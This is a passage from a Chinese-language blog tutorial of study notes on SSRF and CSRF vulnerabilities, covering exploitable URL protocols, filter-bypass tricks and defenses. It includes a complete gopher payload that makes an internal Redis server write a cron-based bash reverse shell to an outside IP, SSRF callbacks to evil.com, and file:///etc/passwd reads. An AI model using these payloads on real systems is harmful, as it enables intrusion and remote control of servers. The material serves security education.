<p>6.file_get_contents() // file_get_contents支持php://input协议</p>
</blockquote>
<h4 id="可利用协议"><a href="#可利用协议" class="headerlink" title="可利用协议"></a>可利用协议</h4><ul>
<li><strong>file协议</strong></li>
</ul>
<p>结合<code>目录遍历</code>读取文件，从文件系统中获取文件内容。如<code>file:///etc/passwd</code>，其中<code>/etc/passwd</code>是用户账户文件。</p>
<ul>
<li><strong>gopher协议</strong></li>
</ul>
<p>分布式文档传递服务，可以<code>打开端口</code>，可以使用<code>gopherus</code>生成<code>payload</code></p>
<ul>
<li><strong>dict协议</strong></li>
</ul>
<p>· 字典服务器协议，可以访问字典资源，如<code>dict:///ip:6739/info</code>，其中<code>info</code>是Redis的常用命令。</p>
<p>· 可以探测指纹信息，使用格式如下：</p>
<blockquote>
<p><strong>dict://ip:port/命令:命令2:命令3</strong></p>
<p>其中，命令是可选字段，每个命令使用冒号隔开。</p>
<p>例：dict://127.0.0.1:6379/set:passwd:123456</p>
<p>dict://127.0.0.1:6379/get:passwd 等</p>
<p>在实际地址栏中，这些指令的显示效果为：</p>
<p>ssrf.php?url=dict://127.0.0.1:6379/set:passwd:123456</p>
<p>ssrf.php?url=dict://127.0.0.1:22</p>
</blockquote>
<p>· 可以写入反弹shell</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240719145304230.png" srcset="/img/loading.gif" lazyload alt="image-20240719145304230"></p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240719145316045.png" srcset="/img/loading.gif" lazyload alt="image-20240719145316045"></p>
<p>· 可以用于<code>结合cURL攻击</code></p>
<p>· 最主要的还是进行<code>端口探测</code>！例如：dict://127.0.0.1:80</p>
<ul>
<li><strong>http/https协议</strong></li>
</ul>
<p>进行<code>内网探测</code></p>
<ul>
<li><strong>ftp协议（sftp、tftp）</strong></li>
</ul>
<p>进行<code>端口扫描</code>。</p>
<p>· sftp，代表SSH文件传输协议（SSH File Transfer Protocol）或安全文件传输协议（Secure File Transfer Protocol）。这是一种与SSH打包在一起的独立协议，它运行在安全连接上，并以如下类似的方式进行工作。</p>
<blockquote>
<p>在目标网站执行：</p>
<p><a target="_blank" rel="noopener" href="http://example.com/ssrf.php?url=sftp://evil.com:9999/">http://example.com/ssrf.php?url=sftp://evil.com:9999/</a></p>
<p><code>evil.com</code>指代目标网站的域名或IP地址，其后冒号跟着的是自己设置的监听端口号。</p>
<p>在本地（如kali）终端开启监听，等待来自目标服务器的连接：</p>
<p>local:$ nc -lvvp 9999</p>
<p>Connection from [192.168.0.12] port 9999[tcp/*]<br>accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</p>
<p>nc命令的输出表明（是别人的输出捏）攻击者已经成功接受了来自目标服务器的连接，即连接被建立了。</p>
</blockquote>
<p>· tftp，（Trivial File Transfer Protocol,简单文件传输协议），是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p>
<blockquote>
<p>在目标网站执行：</p>
<p><a target="_blank" rel="noopener" href="http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</a></p>
<p>其中，<code>TESTUDPPACKET</code>是一个UDP数据包</p>
<p>local:# nc -lvup 1337<br>Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</p>
</blockquote>
<h3 id="3、漏洞利用"><a href="#3、漏洞利用" class="headerlink" title="3、漏洞利用"></a>3、漏洞利用</h3><h4 id="漏洞验证方式"><a href="#漏洞验证方式" class="headerlink" title="漏洞验证方式"></a>漏洞验证方式</h4><ul>
<li>排除法：浏览器f12查看源代码看是否是在本地进行了请求</li>
<li>使用dnslog等工具进行测试，看是否被访问(可以再盲打后台，比如将当前准备请求的url和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求)</li>
<li>抓包分析发送的请求是不是通过服务器发送的，如果不是客户端发出的请求，则有可能是存在漏洞。接着找存在HTTP服务的内网地址：</li>
</ul>
<blockquote>
<p>从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p>
<p>通过二级域名暴力猜解工具模糊猜测内网地址</p>
<p>通过file协议读取内网信息获取相关地址</p>
</blockquote>
<ul>
<li>留意bool型SSRF，通过判断两次不同请求结果的差异来判断是否存在SSRF，类似布尔型sql盲注方法</li>
<li>直接返回Banner、title、content等信息</li>
</ul>
<h4 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h4><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p>
<p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p>
<p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p>
<p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p>
<p>5.利用file协议读取本地文件等;</p>
<p>6.各个协议调用探针：http,file,dict,ftp,gopher等;</p>
<blockquote>
<p>http:192.168.64.144/phpmyadmin/<br>file:///D:/<a target="_blank" rel="noopener" href="http://www.txt/">www.txt</a><br>dict://192.168.64.144:3306/info<br><a href="ftp://192.168.64.144/">ftp://192.168.64.144:21</a></p>
</blockquote>
<p>7、本地利用和远程利用</p>
<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/258449.html">ssrf知识点总结</a></p>
<h3 id="4、绕过方式"><a href="#4、绕过方式" class="headerlink" title="4、绕过方式"></a>4、绕过方式</h3><h4 id="绕过（http基本身份认证绕过）"><a href="#绕过（http基本身份认证绕过）" class="headerlink" title="@绕过（http基本身份认证绕过）"></a>@绕过（http基本身份认证绕过）</h4><p>使用前提：目标网站对访问的域名进行限制，且其本身存在ssrf漏洞时。</p>
<blockquote>
<p>url的完整格式为：</p>
<p>协议类型://访问资源需要的凭证信息@服务器地址:端口号/资源层级UNIX文件路径（精确到文件名）?查询#片段ID</p>
</blockquote>
<p>因此！</p>
<blockquote>
<p>访问<code>&lt;a href=&quot;http://baidu.com@1.1.1.1&quot;&gt;</code>、<code>http://baidu.com@1.1.1.1</code></p>
<p>与</p>
<p>访问<code>http://1.1.1.1</code></p>
<p>其得到的效果是一样的。因为解析的本就是@后的服务器地址。</p>
<p>意思就是！比如，ssrf只允许访问百度：</p>
<p><code>http://127.0.0.1/ssrf.php?url=https://www.baidu.com</code></p>
<p>我们的目标是绕过百度访问搜狗，可以使用@绕过：</p>
<p><code>http://127.0.0.1/ssrf.php?url=https://www.baidu.com@www.sogou.com</code></p>
<p>注意：在对@解析域名中，不同的处理函数存在处理差异，比如在PHP的parse_url()中会识别<code>www.sogou.com</code>，而libcurl()则识别为<code>www.baidu.com</code>。</p>
</blockquote>
<h4 id="进制绕过"><a href="#进制绕过" class="headerlink" title="进制绕过"></a>进制绕过</h4><blockquote>
<p>顾名思义，就是使用<code>进制转换</code>来进行绕过嘛！将一些关键数字参数使用<code>二进制</code>、<code>八进制</code>、<code>十六进制</code>、<code>十进制整数格式</code>进行转换。</p>
<p>比如，IP地址 192.168.0.1 可以被改写为：</p>
<p>八进制格式：0300.0250.0.1</p>
<p>十六进制格式：0xC0.0xA8.0.1</p>
<p>十进制整数格式：3232235521（第一次听说这个哈哈哈）</p>
</blockquote>
<ul>
<li>————————————————————————</li>
</ul>
<p>IP地址的十进制整数格式计算方法：</p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721391030526.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721390879675.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<ul>
<li>————————————————————————</li>
</ul>
<h4 id="用句号-。-替换"><a href="#用句号-。-替换" class="headerlink" title="用句号"。"替换 ".""></a>用句号"。"替换 "."</h4><blockquote>
<p>将IP地址中各个分隔部分的“.”号均分别使用“。”替代：</p>
<p>例：192.168.204.128 ----> 192。168。204.128</p>
<p>但是执行过程中，右边的表达也会被解析为左边的表达。</p>
</blockquote>
<h4 id="xip-io-和-xip-name-绕过"><a href="#xip-io-和-xip-name-绕过" class="headerlink" title="xip.io 和 xip.name 绕过"></a>xip.io 和 xip.name 绕过</h4><p>使用前提：服务端没有先解析IP再过滤内网地址，就可以使用localhost等解析到内网的域名。（ xip.name在使用上与xip.io一致）</p>
<p>此外，如果php后端只使用parse_url函数中的host参数判断是否等于127.0.0.1，那么就可以使用<code>xip.io</code>、<code>nip.io</code>、<code>sslip.io</code>这些特殊网址进行绕过。</p>
<blockquote>
<p><code>xip.io</code>可以指向任意域名。所以可以将其与内网IP/域名进行绑定，使其解析到内网。</p>
<p>例；<code>http://127.0.0.1.xip.io/1.php</code>实际上会解析到<code>http://127.0.0.1/1.php</code></p>
</blockquote>
<h4 id="添加端口号"><a href="#添加端口号" class="headerlink" title="添加端口号"></a>添加端口号</h4><p>有些网站可能会限制子网段。因此可以在URL中目标IP地址后面使用冒号“:”添加服务端口号，常用的是，添加<code>：80</code>端口绕过。</p>
<h4 id="利用-绕过"><a href="#利用-绕过" class="headerlink" title="利用[::]绕过"></a>利用[::]绕过</h4><p>利用<code>[::]</code>来实现绕过。<code>http://[::]:80/</code>会解析为<code>http://127.0.0.1</code></p>
<h4 id="DNS-重绑（Rebinding）"><a href="#DNS-重绑（Rebinding）" class="headerlink" title="DNS 重绑（Rebinding）"></a>DNS 重绑（Rebinding）</h4><p>工具网站：<a target="_blank" rel="noopener" href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36348899/article/details/119297854">[DNS安全] 详解DNS重绑定攻击</a></p>
<blockquote>
<p>重绑逻辑：</p>
<p>1、判定你给的 IP 或者域名解析后的 IP 是否在黑名单中</p>
<p>2、若在，退出报错</p>
<p>3、若不在，再次访问你给的 IP 或者域名解析后的 IP；执行后续业务模块</p>
<p>实现效果：</p>
<p>拥有一个域名，其映射到两个IP。同时设置 TTL 为 0，方便两个 IP 切换。</p>
<p>效果类比：你访问wwfcww.xyz这个域名，第一次解析的 IP 是 192.168.0.1；而第二次解析的IP是 127.0.0.1，如此一来即可进行 SSRF 攻击。</p>
</blockquote>
<h4 id="非HTTP协议绕过"><a href="#非HTTP协议绕过" class="headerlink" title="非HTTP协议绕过"></a>非HTTP协议绕过</h4><p>如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。比如通过<code>gopher</code>，可以在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的。</p>
<p> 例，使用gopher协议对与内网的Redis服务进行攻击，可使用如下url：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gopher://127.0.0.1:6379/_*1%0d%0a<span class="hljs-variable">$8</span>%0d%0aflushall%0d%0a*3%0d%0a<span class="hljs-variable">$3</span>%0d%0aset%0d%0a<span class="hljs-variable">$1</span>%0d%0a1%0d%0a<span class="hljs-variable">$64</span>%0d%0a%0d%0a%0a%0a*/1* * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/23330&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a<span class="hljs-variable">$6</span>%0d%0aconfig%0d%0a<span class="hljs-variable">$3</span>%0d%0aset%0d%0a<span class="hljs-variable">$3</span>%0d%0adir%0d%0a<span class="hljs-variable">$16</span>%0d%0a/var/spool/cron/%0d%0a*4%0d%0a<span class="hljs-variable">$6</span>%0d%0aconfig%0d%0a<span class="hljs-variable">$3</span>%0d%0aset%0d%0a<span class="hljs-variable">$10</span>%0d%0adbfilename%0d%0a<span class="hljs-variable">$4</span>%0d%0aroot%0d%0a*1%0d%0a<span class="hljs-variable">$4</span>%0d%0asave%0d%0aquit%0d%0a<br></code></pre></td></tr></table></figure>

<p>前面讲漏洞利用的时候提到过协议渗透。请回去复习。</p>
<h3 id="5、漏洞防御"><a href="#5、漏洞防御" class="headerlink" title="5、漏洞防御"></a>5、漏洞防御</h3><blockquote>
<p>1、在内网设备上建立黑名单内网IP，禁止公开服务器的访问。</p>
<p>2、过滤返回信息，对响应用户请求的返回信息进行验证。</p>
<p>3、禁用端口banner信息。</p>
<p>4、禁用不必要的协议，防止file协议等。</p>
<p>5、根据业务需求设定URL格式。防止攻击者构建攻击语句6、统一错误信息，避免攻击者根据错误信息判断端口状态7、限制请求端口。</p>
</blockquote>
<h2 id="④CSRF跨站请求伪造"><a href="#④CSRF跨站请求伪造" class="headerlink" title="④CSRF跨站请求伪造"></a>④CSRF跨站请求伪造</h2><h3 id="1、漏洞简介-2"><a href="#1、漏洞简介-2" class="headerlink" title="1、漏洞简介"></a>1、漏洞简介</h3><p>· csrf（xsrf），跨站请求伪造，也被称为one-click attack 或 session riding。是一种<code>挟持用户在当前已登录的web应用程序上执行非本意操作</code>的攻击方法。</p>
<p>· <strong>原理</strong>：黑客利用已登陆的用户，<code>诱使其访问或登陆某个早已构造好的恶意链接或页面</code>，然后在<code>用户毫不知情</code>的情况下，<code>以用户的名义完成了非用户本意的非法操作</code>。</p>
<p>· <strong>实现的效果</strong>：csrf跨站请求伪造的实现效果，可以理解为攻击者盗用了合法用户的身份，以其名义在恶意网站发送恶意请求，合法用户发起的恶意请求对服务器来说是合法的。</p>
<p>· <strong>与XSS跨站脚本攻击相比</strong>：</p>
<blockquote>
<p>XSS利用的是用户对指定网站的信任（攻击者预先将恶意代码插入网站网页中）</p>
<p>CSRF利用的是网站对用户网页浏览器的信任。（攻击者诱使用户点击恶意链接或页面进而向服务器发送恶意请求）</p>
<p>注意！</p>
<p>CSRF攻击中，攻击者并没有拿到用户的权限。是借用户的权限完成了攻击（“借刀杀人”）</p>
<p>而XSS攻击中，攻击者可以通过盗取cookie来获取用户权限进而完成破坏。（“侵占”）</p>
</blockquote>
<p>· <strong>攻击细节</strong>：</p>
<p>csrf（跨站请求攻击）简单来说，就是攻击者通过一些技术手段<code>欺骗</code>用户的浏览器去访问一个用户<code>曾经认证过的网站</code>并运行一些操作（如发邮件、发信息、财产操作如转账或购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。</p>
<p>攻击过程中利用了web中用户身份验证的漏洞：<code>简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的</code>。</p>
<p>典型示例：tom登陆了银行网站且没有退出，此时浏览器中包含着tom在银行的身份验证信息 ----  攻击者将伪造的转账请求包含在帖子中，并发送给tom ----  tom在银行网站保持登陆的情况下浏览帖子 ----  即会将伪造的转账请求连同身份的认证信息发送到银行网站 ----  银行网站看到身份认证信息，认为请求是tom的合法操作。</p>
<p>· <strong>原理总结</strong>：</p>
<blockquote>
<p>一个CSRF漏洞攻击的实现，其需要由‘几个部分’来构成：</p>
<p>1、首先，需要有一个漏洞存在（无需验证、任意修改后台数据、新增请求）</p>
<p>2、伪装数据操作请求的恶意链接或页面</p>
<p>3、诱使用户主动访问或登陆恶意链接，触发非法操作</p>
</blockquote>
<h3 id="2、漏洞检测"><a href="#2、漏洞检测" class="headerlink" title="2、漏洞检测"></a>2、漏洞检测</h3><ul>
<li><p>方法一：抓取一个正常请求的数据包，去掉referer字段后再重新提交，如果该提交还是有效的，那么基本上可以确认目标网站存在csrf漏洞。</p>
</li>
<li><p>方法二：使用专门针对csrf漏洞检测的工具进行检测，如CSRFTester，CSRF Request Builder 等。</p>
</li>
</ul>
<blockquote>
<p>CSRFTester漏洞检测工具的测试原理：首先需要抓取我们在浏览器中访问过的所有链接以及所有表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这部操作相当于伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞。</p>
<p>（所以这些检测工具也可以被用来执行CSRF攻击！）</p>
</blockquote>
<h3 id="3、漏洞利用-1"><a href="#3、漏洞利用-1" class="headerlink" title="3、漏洞利用"></a>3、漏洞利用</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/wudideaqing/article/details/139678044">CSRF(跨站请求伪造)漏洞 (带靶场演示+漏洞挖掘）</a></p>
<h4 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h4><p>有以下五种：</p>
<blockquote>
<ul>
<li>链接点击：</li>
</ul>
<p>攻击者通过邮件、社交媒体或其它方式发送包含恶意请求的链接，并诱导用户点击。</p>
<ul>
<li>隐藏表单</li>
</ul>
<p>在恶意网站上嵌入隐藏的表单，诱导用户在不知情的情况下触发表单提交。</p>
<ul>
<li>自动提交表单</li>
</ul>
<p>在恶意网站上使用javascript自动提交包含恶意请求的表单。如，编写响应功能的POC。</p>
<ul>
<li>图像加载</li>
</ul>
<p>在恶意网站嵌入图像标签，图像URL指向目标网站的恶意请求。</p>
<ul>
<li>跨域请求</li>
</ul>
<p>利用XMLHttpRequest或Fetch API发送跨域请求。（但是这通常会被浏览器中的同源策略和CORS限制）</p>
<p>CORS：跨源资源共享机制。用于定义在一个域中加载的客户端web应用程序与另一个域中的资源交互方式。</p>
</blockquote>
<h3 id="4、漏洞防御"><a href="#4、漏洞防御" class="headerlink" title="4、漏洞防御"></a>4、漏洞防御</h3><ul>
<li><strong>检查Referer字段</strong></li>
</ul>
<p>在HTTP协议头中有一个字段叫做Referer，它记录了该HTTP请求的来源地址。在处理敏感数据请求时，Referer字段（<code>不会骗人的真实请求地址</code>）应该要和请求的地址（<code>对方声称的请求地址</code>）处于同一个域名下。</p>
<p>但是该由于Referer的值是由浏览器提供的，每个浏览器对于Referer字段的具体实现存在差别，因此，并不能保证浏览器自身并没有安全漏洞。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/SongSir001/article/details/98182051">CSRF（跨站请求伪造） 漏洞与预防-有预防代码实现</a></p>
<ul>
<li><strong>在请求地址中添加token并验证</strong></li>
</ul>
<p>CSRF攻击成功的原因是：因为攻击者能够<code>伪造用户的请求</code>，且该请求中所有的用户验证信息<code>都存在于cookie</code>中，因此攻击者可以在无需知道用户验证信息的情况下直接利用用户自己的cookie来通过安全验证。</p>
<p>所以！抵御CSRF攻击的关键在于：<code>在请求中放入一些攻击者不能伪造的信息，并且该信息不存在于cookie当中</code>。</p>
<p>所以，系统开发者可以在HTTP请求中以参数的形式加入一个随机产生的token，并在该服务器上建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。（这个防御手法一般是开发人员做）</p>
<ul>
<li><strong>当前用户密码验证</strong></li>
</ul>
<p>在修改关键信息时，要求当前用户输入其自身的密码，以验证当前用户身份的真伪，进而防止未授权的恶意操作。</p>
<ul>
<li><strong>SameSite Cookie 属性</strong></li>
</ul>
<p>设置 Cookie 的 SameSite 属性为 Strict 或 Lax，防止跨站请求携带 Cookie。</p>
<ul>
<li><strong>定期重置 Session ID</strong></li>
</ul>
<p>降低会话被劫持的风险，确保会话令牌的安全性。</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>基础漏洞（一）之SQL注入、XSS、SSRF、CSRF</div>
      <div>https://haoisbinlove.github.io/2024/08/02/基础漏洞（一）之SQL注入、XSS、SSRF、CSRF/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Sweety</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2024年8月2日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2024/07/30/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%EF%BC%88%E4%B8%80%EF%BC%89/" title="渗透测试（一）">
                        <span class="hidden-mobile">渗透测试（一）</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init(Object.assign({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      scrollSmooth    : true,
      includeTitleTags: true,
      headingsOffset  : -boardTop,
    }, CONFIG.toc));
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }

    Fluid.events.registerRefreshCallback(function() {
      if ('tocbot' in window) {
        tocbot.refresh();
        var toc = jQuery('#toc');
        if (toc.length === 0 || !tocbot) {
          return;
        }
        if (toc.find('.toc-list-item').length > 0) {
          toc.css('visibility', 'visible');
        }
      }
    });
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
